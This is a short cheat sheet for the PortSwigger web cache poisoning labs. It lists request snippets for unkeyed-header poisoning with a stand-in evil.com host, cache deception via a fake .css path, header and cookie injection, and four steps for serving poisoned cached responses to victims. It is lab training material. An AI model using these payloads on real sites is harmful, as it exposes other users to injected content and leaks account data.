# PortSwigger Web Cache Poisoning Labs — Complete Reference

## Unkeyed Headers
```bash
# If X-Forwarded-Host is unkeyed:
GET / HTTP/1.1
X-Forwarded-Host: evil.com
```
→ Response generated with `evil.com` → cached → served to other users

## Cache Deception
```bash
# Request non-existent .css extension
GET /account.php/nonexistent.css
```
→ If cache stores by full URL, sensitive data is cached

## Cache Key Injection
```bash
# If multiple headers used for cache key:
X-Original-URL: /admin
```
→ Cache stores response for different URL

## Unkeyed Query Parameters
```bash
GET /?cb=123 HTTP/1.1
```
→ If `cb` is unkeyed, use for cache poisoning

## Cookie-based poisoning
```bash
Cookie: session=malicious-payload
```
→ If cookie unkeyed, inject into cached response

## Practical Example
1. Find unkeyed input (header, cookie, param)
2. Generate response with malicious injected content
3. Cache the poisoned response
4. Victims get malicious response from cache
